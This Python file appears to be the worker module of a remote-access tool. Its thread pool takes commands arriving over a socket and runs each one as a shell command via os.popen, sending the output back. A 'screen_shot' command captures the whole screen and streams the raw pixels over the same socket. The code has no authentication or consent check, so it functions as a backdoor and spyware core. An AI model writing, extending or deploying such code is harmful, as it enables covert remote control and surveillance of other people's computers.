import os
import queue
import threading
import struct
from PIL import ImageGrab
from PIL import Image

try:
    # built-in driver (1.1.3 and later)
    grabber = Image.core.grabscreen
except AttributeError:
	# stand-alone driver (pil plus)
	from PIL import _grabscreen
	grabber = _grabscreen.grab
	print('import _grabscreen')

class TaskThread(threading.Thread):
	def __init__(self, task_queue, req_queue):
		threading.Thread.__init__(self)
		print(1)
		self.task_queue = task_queue
		self.req_queue = req_queue
	
	def deal_task(self):
		while 1:
			task = self.task_queue.get()
			sock = task['sock']
			comm = task['command']
			print(comm)
			if comm == 'screen_shot':
				self.screen_shot(sock)
			elif comm != '':
				try:
					results = os.popen(comm).readlines()
					print(results)
					req = '' 
					for result in results:
						req = req + result
					if req=='':
						req= 'error'
					sock.send(req.encode('utf-8'))
				except Exception as e:
					sock.send(e.encode('utf-8'))
	
	def run(self):
		self.deal_task()

	def screen_shot(self, sock):
		#self.im = ImageGrab.grab()
		s, data = grabber()
		w,h = s
		size = w*h*struct.calcsize('3b')
		data_size = struct.pack('3i', size,w,h)
		sock.send(data_size)
		sock.send(data)
		print(len(data),size)

class TaskTreadPool():
	def __init__(self, task_queue, req_queue):
		self.task_queue = task_queue
		self.req_queue = req_queue
		self.threads = []
	
	def create_threads(self, num):
		for i in range(num):
			task_tread = TaskThread(self.task_queue, self.req_queue)
			#self.threads.append(task_tread)
			task_tread.start()
			print(2)
